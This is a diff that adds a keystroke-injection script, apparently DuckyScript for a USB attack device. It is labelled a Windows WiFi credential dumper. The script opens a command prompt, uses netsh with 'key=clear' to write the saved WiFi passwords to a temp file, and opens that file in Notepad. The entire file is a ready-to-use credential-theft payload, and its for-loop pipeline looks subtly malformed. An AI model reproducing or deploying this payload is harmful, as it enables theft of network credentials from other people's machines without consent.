@@ -1,0 +1,21 @@
+REM Windows WiFi Credential Dumper
+REM Dumps saved WiFi passwords
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM Create output file
+STRING netsh wlan show profiles > %temp%\wifi_profiles.txt
+ENTER
+DELAY 1000
+REM Dump each profile's key
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> %temp%\wifi_keys.txt
+ENTER
+DELAY 3000
+STRING notepad %temp%\wifi_keys.txt
+ENTER
+DELAY 1500
+REM Clean up window
+ALT F4
